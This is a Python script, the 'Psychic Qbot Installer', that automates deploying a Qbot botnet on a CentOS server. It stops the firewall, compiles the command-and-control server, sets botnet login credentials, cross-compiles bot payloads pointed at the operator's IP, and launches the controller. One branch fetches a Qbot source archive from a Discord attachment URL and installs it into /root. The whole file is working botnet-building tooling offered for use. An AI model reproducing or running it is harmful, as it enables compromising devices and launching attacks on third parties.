# -*- coding: utf-8 -*-
from __future__ import unicode_literals
# | --------------------------------------------
# | Note: This Is Made For Centos Machines Only
# | --------------------------------------------
# | Simple AutoInstaller For Qbot Malware.
# | --------------------------------------------

# Don't forget to add a source download link to line 180 to automatically download if they dont have a source already in the VPS

import subprocess, time, sys, random

def run(cmd):
    subprocess.call(cmd, shell=True)
    run('clear')
    
    print("\x1b[37m")
    run('clear')
    username = raw_input("""Welcome to \x1b[31mPsychic Qbot Installer v1.0
                         \x1b[37mPlease enter your desired username\x1b[37m: """)
    run('clear')

intro = raw_input("""
\x1b[32m.==================================================================.
\x1b[32m||   \x1b[37m(\x1b[31m!\x1b[37m)  \x1b[36mA  m  G   \x1b[37m(\x1b[31m!\x1b[37m)  \x1b[36mPsychic Installer  \x1b[37m(\x1b[31m!\x1b[37m)   \x1b[36mA   m   G  \x1b[37m(\x1b[31m!\x1b[37m)  \x1b[37m||
\x1b[32m|'================================================================'|
\x1b[32m||\x1b[35m                                  .::::.                        \x1b[32m||
\x1b[32m||\x1b[35m                                .::::::::.                      \x1b[32m||
\x1b[32m||\x1b[35m                                :::::::::::                     \x1b[32m||
\x1b[32m||\x1b[35m                                ':::::::::::..                  \x1b[32m||
\x1b[32m||\x1b[35m                                 :::::::::::::::'               \x1b[32m||
\x1b[32m||\x1b[35m                                  ':::::::::::.                 \x1b[32m||
\x1b[32m||\x1b[35m                                    .::::::::::::::'            \x1b[32m||
\x1b[32m||\x1b[35m                                  .:::::::::::...               \x1b[32m||
\x1b[32m||\x1b[35m                                 ::::::::::::::''               \x1b[32m||
\x1b[32m||\x1b[35m                     .:::.       '::::::::''::::                \x1b[32m||
\x1b[32m||\x1b[35m                   .::::::::.      ':::::'  '::::               \x1b[32m||
\x1b[32m||\x1b[35m                  .::::':::::::.    :::::    '::::.             \x1b[32m||
\x1b[32m||\x1b[35m                .:::::' ':::::::::. :::::      ':::.            \x1b[32m||
\x1b[32m||\x1b[35m              .:::::'     ':::::::::.:::::       '::.           \x1b[32m||
\x1b[32m||\x1b[35m            .::::''         '::::::::::::::       '::.          \x1b[32m||
\x1b[32m||\x1b[35m           .::''              '::::::::::::         :::...      \x1b[32m||
\x1b[32m||\x1b[35m        ..::::                  ':::::::::'        .:' ''''     \x1b[32m||
\x1b[32m||\x1b[35m     ..''''':'                    ':::::.'                      \x1b[32m||
\x1b[32m|'================================================================\x1b[32m'|
\x1b[32m||\x1b[36m                                        ,,          ,,          \x1b[32m||
\x1b[32m||\x1b[36m ,7MMWMMMq.                          ,7MM          db           \x1b[32m||
\x1b[32m||\x1b[36m   MM   ,MM.                           MM                       \x1b[32m||
\x1b[32m||\x1b[36m   MM   ,M9 ,pP'Ybd `7M'   `MF',p6'bo  MMpMMMb.  `7MM  ,p6`bo   \x1b[32m||
\x1b[32m||\x1b[36m   MMmmdM9  8I   ``   VA   ,V 6M'  OO  MM    MM    MM 6M'  OO   \x1b[32m||
\x1b[32m||\x1b[36m   MM       `YMMMa.    VA ,V  8M       MM    MM    MM 8M        \x1b[32m||
\x1b[32m||\x1b[36m   MM       L.   I8     VVV   YM.    , MM    MM    MM YM.    ,  \x1b[32m||
\x1b[32m||\x1b[36m .JMML.     M9mmmP'     ,V     YMbmd'.JMML  JMML..JMML.YMbmd`   \x1b[32m||
\x1b[32m||\x1b[36m                       ,V                                       \x1b[32m||
\x1b[32m||\x1b[36m                    OOb`                                        \x1b[32m||
\x1b[32m'=================================================================='""")
 
print("""
 
                   \x1b[37mWelcome to \x1b[31mPsychic Qbot Installer v1.0
 
Please press enter when ready: """)
time.sleep(2)
run('clear')
 
print("""
 
                           \x1b[37mWelcome to \x1b[31mPsychic Qbot Installer v1.0
 
                     \x1b[31mPress: '1' To Setup, Configure, and Install Qbot""")
 
cmdline = raw_input("\x1b[96m" + username + "\x1b[37m@\x1b[31mPsychic \x1b[37m~]# ")
 
if cmdline == "1":
    time.sleep(2)
    run('clear')
    time.sleep(2)
    yesorno = raw_input("""Before starting, Psychic Qbot Installer will need a bit of information from you...
NOTE: If you already have a Qbot source downloaded and on your VPS, Psychic Qbot Installer will need some information from you.
If you do not have a Qbot Source, simply press "n" and Psychic Qbot Installer will download and install one for you.
Do you already have a Qbot source downloaded and on your VPS? (y/n): """)
    if yesorno == "y":
        clientinfo = raw_input("\nWhat is the name of your Qbot source's client? (With the .c): ")
        serverinfo = raw_input("What is the name of your Qbot source's serverside? (With the .c): ")
        ccinfo = raw_input("What is the name of your Qbot source's cross compiler? (With the .py): ")
        botport = raw_input("What is your Qbot Source's BotPort?: ")
        cncport = raw_input("What would you like your CNCPort to be for your botnet?: ")
        user = raw_input("What would you like your Botnet Login Username to be?: ")
        userpass = raw_input("What would you like your Botnet Login Password to be?: ")
        ipinfo = raw_input("What is your Server IP?: ")
        print("Thank you for the information.")
        time.sleep(2)
        print("")
        print("\x1b[31mATTENTION\x1b[37m: \x1b[31mPsychic Qbot Installer \x1b[37mwill now take control, \x1b[31mplease do not touch your mouse or keyboard.")
        confirm = raw_input("\x1b[37mPlease press enter when you are ready, and your Qbot will be setup for you: ")
        print("")
        print("Entering Ludicrous Mode...")
        time.sleep(1)
        
        print("")
        print("\x1b[31mInstalling Dependencies...\x1b[37m")
        print("")
        
        run('yum install gcc screen nano httpd python perl -y; ulimit -n 99999')
        
        print("")
        print("\x1b[32mDependencies Installed!")
        print("")
        print("\x1b[31mStopping IPTables...\x1b[37m")
        print("")
        
        run('iptables -F; service iptables stop')
        
        print("")
        print("\x1b[32mIPTables Stopped!")
        print("")
        print("\x1b[31mCompiling Serverside...\x1b[37m")
        print("")
        
        run('gcc ' + serverinfo + ' -o server -pthread')
        
        print("")
        print("\x1b[32mServerside Compiled!\x1b[37m")
        print("")
        print("\x1b[31mSetting up your botnet login...\x1b[37m")
        print("")
        
        run('echo ' + user + ' ' + userpass +' >> login.txt')
        
        print("")
        print("\x1b[32mLogin Setup!\x1b[37m")
        print("")
        print("\x1b[31mPreparing to Cross Compile your source... (Press Y when it asks to 'Get Archs')\x1b[37m")
        print("")
        time.sleep(3)
        run('python ' + ccinfo + ' ' +clientinfo + ' ' + ipinfo)
        
        print("")
        print("\x1b[31mPlease save your payload. You have 20 seconds before Psychic Qbot Installer will move on..\x1b[37m")
        print("")
        for i in xrange(20,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1)
        print("")
        print("\x1b[31mPreparing to screen your CNC... Once the screen goes black, detach by doing CTRL A+D\x1b[37m")
        print("")
        time.sleep(5)
        print("\x1b[32mScreening NOW!")
        time.sleep(1)
        run('screen ./server ' + botport + ' 850 ' +cncport)
        
        run('clear')
        
        print("")
        print("Thank you for using Psychic Qbot Installer v1.0")
        print("Your Qbot has been setup and is screened on port " +cncport)
        print("")
        print("Psychic Qbot Installer Shutting Down...")
        for i in xrange(2,0,-1):
            sys.stdout.write(str(i)+' ')
            sys.stdout.flush()
            time.sleep(1)
        print("")
        exit()
    
    if yesorno == "n":
        time.sleep(2)
        print("")
        print("\x1b[31mATTENTION\x1b[37m: \x1b[31mPsychic Qbot Installer \x1b[37mwill now take control, \x1b[31mplease do not touch your mouse or keyboard.")
        confirm = raw_input("\x1b[37mPlease press enter when you are ready, and your Qbot will be setup for you: ")
        print("")
        print("Entering Ludicrous Mode...")
        time.sleep(1)
        
        print("")
        print("\x1b[31mDownloading Qbot Source...\x1b[37m")
        print("")
 
        run('wget https://cdn.discordapp.com/attachments/586514958548860958/586580593467326485/Yakuza.zip')# change to a download link of a source
        run('unzip Yakuza.zip')
        run('mv Yakuza/* /root')
        run('rm -rf Yakuza/')
 
        print("\x1b[32mQbot Source Downloaded!\x1b[37m")
